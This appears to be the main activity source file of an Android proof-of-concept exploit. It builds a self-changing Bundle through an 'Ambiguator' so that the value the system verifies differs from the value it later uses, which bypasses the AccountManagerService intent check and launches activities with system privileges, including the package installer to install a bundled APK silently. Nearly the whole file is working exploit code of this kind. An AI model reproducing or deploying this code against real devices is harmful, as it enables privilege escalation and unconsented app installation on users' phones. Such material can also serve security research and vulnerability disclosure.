package com.example.ambigousbundle3;

import android.accounts.AccountManager;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.view.View;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    /**
     * Test Ambiguator in this process
     */
    public void doInProcessTest(View view) throws Exception {
        Bundle bundle;
        // Evildoer part
        {
            Bundle verifyMe = new Bundle();
            verifyMe.putString("cmd", "something_safe");
            Bundle useMe = new Bundle();
            useMe.putString("cmd", "replaced_thing");
            Ambiguator a = new Ambiguator();
            bundle = a.make(verifyMe, useMe);
        }

        // Victim part
        bundle = reparcel(bundle); // Emulate binder call (evil app -> system_server, system_server verifies)
        String value1 = bundle.getString("cmd");
        bundle = reparcel(bundle); // Emulate binder call (system_server -> system app, app uses value)
        String value2 = bundle.getString("cmd");
        Toast.makeText(this, value1 + "/" + value2, Toast.LENGTH_SHORT).show();
    }

    /**
     * Write bundle to parcel and read it (simulate binder call)
     */
    private Bundle reparcel(Bundle source) {
        Parcel p = Parcel.obtain();
        p.writeBundle(source);
        p.setDataPosition(0);
        Bundle copy = p.readBundle();
        p.recycle();
        return copy;
    }

    /**
     * Start activity using system privileges
     *
     * Will use self-changing bundle to bypass check in AccountManagerService
     */
    private void doStartActivity(Intent intent) throws Exception {
        Bundle verifyMe = new Bundle();
        verifyMe.putParcelable(AccountManager.KEY_INTENT, new Intent(this, MainActivity.class));
        Bundle useMe = new Bundle();
        useMe.putParcelable(AccountManager.KEY_INTENT, intent);

        Ambiguator a = new Ambiguator();
        AuthService.addAccountResponse = a.make(verifyMe, useMe);

        startActivity(new Intent()
                .setClassName("android", "android.accounts.ChooseTypeAndAccountActivity")
                .putExtra("allowableAccountTypes", new String[] {"com.example.ambigousbundle3.account"})
        );
    }

    public void doStartPlatLogo(View view) throws Exception {
        doStartActivity(new Intent().setClassName("android", "com.android.internal.app.PlatLogoActivity"));
    }

    public void doInstallApk(View view) throws Exception {
        // Unpack apk
        File dir = getExternalCacheDir();
        dir.mkdirs();
        File file = new File(dir, "dropme.apk");
        if (!file.exists()) {
            FileOutputStream out = new FileOutputStream(file);
            InputStream in = getAssets().open("ApiDemos.apk");
            byte[] buf = new byte[4096];
            int len;
            while ((len = in.read(buf)) != -1) {
                out.write(buf, 0, len);
            }
        }

        // Find installer component name
        ComponentName[] knownInstallerComponents = new ComponentName[] {
                // Android <= 7.0
                new ComponentName("com.android.packageinstaller", "com.android.packageinstaller.InstallAppProgress"),
                // Android O preview
                new ComponentName("com.android.packageinstaller", "com.android.packageinstaller.InstallInstalling"),
                // Pixel XL Marlin factory image
                new ComponentName("com.google.android.packageinstaller", "com.android.packageinstaller.InstallAppProgress")
        };

        ComponentName componentName = null;

        PackageManager packageManager = getPackageManager();
        for (ComponentName triedComponent : knownInstallerComponents) {
            try {
                packageManager.getActivityIcon(triedComponent);
            } catch (PackageManager.NameNotFoundException e) {
                continue;
            }
            componentName = triedComponent;
            break;
        }

        if (componentName == null) {
            Toast.makeText(this, R.string.no_installer_component, Toast.LENGTH_SHORT).show();
            return;
        }

        // Start installer
        doStartActivity(new Intent()
                .setComponent(componentName)
                .putExtra("com.android.packageinstaller.applicationInfo", new ApplicationInfo())
                .setData(Uri.fromFile(file))
        );
    }
}
